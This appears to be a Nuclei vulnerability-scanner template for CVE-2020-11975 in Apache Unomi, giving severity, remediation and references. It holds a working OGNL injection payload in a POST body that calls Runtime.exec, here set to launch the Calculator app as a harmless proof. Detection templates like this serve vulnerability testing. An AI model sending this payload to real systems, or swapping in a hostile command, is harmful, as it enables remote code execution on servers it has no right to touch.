id: CVE-2020-11975

info:
  name: Apache Unomi OGNL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Apache Unomi allows conditions to use OGNL scripting which offers the possibility to call static Java classes from the JDK that could execute code with the permission level of the running Java process.
  impact: |
    Successful exploitation could lead to remote code execution and compromise of the affected system.
  remediation: |
    Upgrade to Apache Unomi version 1.5.1 or later to mitigate the vulnerability.
  reference:
    - https://lists.apache.org/thread.html/r01021bc4b25c1e98812efca0b07f0e078a6281bd52f7c3817a429d95%40%3Ccommits.unomi.apache.org%3E
    - https://lists.apache.org/thread.html/r79672c25e0ef9bb4b9148376281200a8e61c6d5ef5bb705e9a363460%40%3Ccommits.unomi.apache.org%3E
    - https://github.com/hoanx4/apche_unomi_rce
    - https://github.com/nomi-sec/PoC-in-GitHub
    - https://github.com/soosmile/POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-11975
    epss-score: 0.00607
    epss-percentile: 0.79232
    cpe: cpe:2.3:a:apache:unomi:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: unomi

http:
  - method: POST
    path:
      - "{{BaseURL}}/context.json"

    headers:
      Content-Type: application/json

    body: |
      {
        "personalizations":[
          {
            "id":"gender-test_anystr",
            "strategy":"matching-first",
            "strategyOptions":{
              "fallback":"var2"
            },
            "contents":[
              {
                "filters":[
                  {
                    "condition":{
                      "parameterValues":{
                        "propertyName":"(#r=@java.lang.Runtime@getRuntime()).(#r.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"))",
                        "comparisonOperator":"equals_anystr",
                        "propertyValue":"male_anystr"
                      },
                      "type":"profilePropertyCondition"
                    }
                  }
                ]
              }
            ]
          }
        ],
        "sessionId":"test-demo-session-id"
      }
    matchers:
      - type: word
        words:
          - "Calculator"
        part: body
